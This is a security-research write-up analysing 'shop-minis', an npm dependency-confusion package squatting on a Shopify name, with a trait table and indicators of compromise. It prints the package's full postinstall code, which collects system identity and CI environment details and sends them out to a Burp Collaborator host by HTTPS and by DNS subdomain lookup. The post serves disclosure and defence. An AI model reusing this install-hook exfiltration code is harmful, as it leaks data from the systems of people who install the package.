---
title: "shop-minis: a Shopify-shaped canary that rats you out to Burp"
date: 2026-05-26
summary: "A 762-byte dependency-confusion probe wearing the name of Shopify's private Shop Minis package, that slurps your CI env vars and ships them out two ways at once — HTTPS and DNS — to a Burp Collaborator."
packageName: shop-minis
ecosystem: npm
---

Shopify ships [Shop Minis](https://shop.app/minis), whose private packages live behind `@shopify/`. The public, unscoped name `shop-minis` is the kind of bare string a build script resolves to npmjs.org when an internal proxy misses. Earlier today `lobo_hunt <practiceextraone@gmail.com>` registered exactly that name and pushed straight to `2.0.5`. The package self-identifies bluntly:

- Description: `Security research canary — shopify`
- Readme (whole file): `Takeover By lobo`

The entire payload runs from `postinstall`:

<pre class="lang-js"><code><span class="tok-kw">const</span> CALLBACK_HOST = <span class="tok-str">'svr57aylqme3zald4p0psi1hw827q1eq.oastify.com'</span>;

<span class="tok-kw">const</span> payload = {
  whoami:   <span class="tok-fn">get</span>(<span class="tok-str">'whoami'</span>),
  id:       <span class="tok-fn">get</span>(<span class="tok-str">'id'</span>),
  hostname: os.<span class="tok-fn">hostname</span>(),
  platform: os.<span class="tok-fn">platform</span>(),
  cwd:      process.cwd(),
  ci:       process.env.CI || <span class="tok-str">''</span>,
  github:   process.env.GITHUB_REPOSITORY || <span class="tok-str">''</span>,
  node_env: process.env.NODE_ENV || <span class="tok-str">''</span>,
};

<span class="tok-kw">const</span> path = <span class="tok-str">'/shopify?'</span> + <span class="tok-kw">new</span> <span class="tok-fn">URLSearchParams</span>(payload).<span class="tok-fn">toString</span>();
https.<span class="tok-fn">get</span>({ host: CALLBACK_HOST, path, timeout: <span class="tok-num">5000</span> }, () =&gt; {}).<span class="tok-fn">on</span>(<span class="tok-str">'error'</span>, () =&gt; {});

<span class="tok-builtin">require</span>(<span class="tok-str">'dns'</span>).<span class="tok-fn">lookup</span>(<span class="tok-tmpl">`<span class="tok-tmpl-expr">${payload.whoami}</span>.<span class="tok-tmpl-expr">${CALLBACK_HOST}</span>`</span>, () =&gt; {});
</code></pre>

`oastify.com` is PortSwigger's Burp Collaborator, polling for any HTTP, DNS, or SMTP interaction against that random subdomain. The two channels are deliberate: the HTTPS GET carries the structured payload, and the DNS lookup leaks `whoami` as the leftmost label so a strict egress allowlist that blocks outbound HTTPS still surfaces it to the resolver. The path label `/shopify` and the canary's name make the experiment explicit — anything that detonates this is something inside Shopify (or built by them) that resolved the bare name against the public registry. The signature reads as bug-bounty research — a `lobo_hunt` publisher, a Burp Collaborator instance, a "Takeover By lobo" readme. That's a different cluster from [the web-dotenv campaign](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) earlier today, but the recipe lands the same either way.

## Traits observed

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/dependency-confusion/namespace-squat` | Public unscoped `shop-minis` shadowing Shopify's internal Shop Minis package |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/recon-exfil/install-hook` | `postinstall` fires `node postinstall.js` and exfils on every install |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/recon-exfil/pipeline` | Collects `CI` and `GITHUB_REPOSITORY` from the runner's environment |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/exfiltration/covert-channel/dns/subdomain-label` | `dns.lookup(\`${whoami}.<burp>\`)` leaks identity past HTTPS egress blocks |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/infrastructure/burp-collaborator` | C2 host is a Burp Collaborator subdomain on `oastify.com` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/exfiltration/sensitive-data/javascript/js-system-info-exfiltration` | `whoami`, `id`, `hostname`, `platform`, `cwd` shipped as URL params |
| <span class="sev-dot notable" title="notable"></span> | `objectives/discovery/system/fingerprint/runtime` | `whoami` / `id` via `execSync` plus `os.hostname()`, `os.platform()` |
| <span class="sev-dot notable" title="notable"></span> | `metadata/package/fields/bin` | Declared `bin: discovery-build` alongside the `postinstall` trigger |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | Self-described "Security research canary — shopify", one-line `Takeover By lobo` readme, no repository URL |

## Indicators

| Type | Value |
| --- | --- |
| Package | `shop-minis@2.0.5` (npm) |
| npm page | [npmjs.com/package/shop-minis](https://www.npmjs.com/package/shop-minis) |
| Published | `2026-05-26T12:06:21Z` |
| Tarball SHA-256 | [`4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016`](https://lab.atomdrift.org/file/4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016) |
| Tarball SHA-1 (npm `shasum`) | `f556b4533e1bcc01f0a1bc5f7af50eba85ad4303` |
| `postinstall.js` SHA-256 | [`7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb`](https://lab.atomdrift.org/file/7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb) |
| HTTPS exfil | `https://svr57aylqme3zald4p0psi1hw827q1eq.oastify.com/shopify?…` |
| DNS exfil | `<whoami>.svr57aylqme3zald4p0psi1hw827q1eq.oastify.com` |
| Publisher | `lobo_hunt <practiceextraone@gmail.com>` |
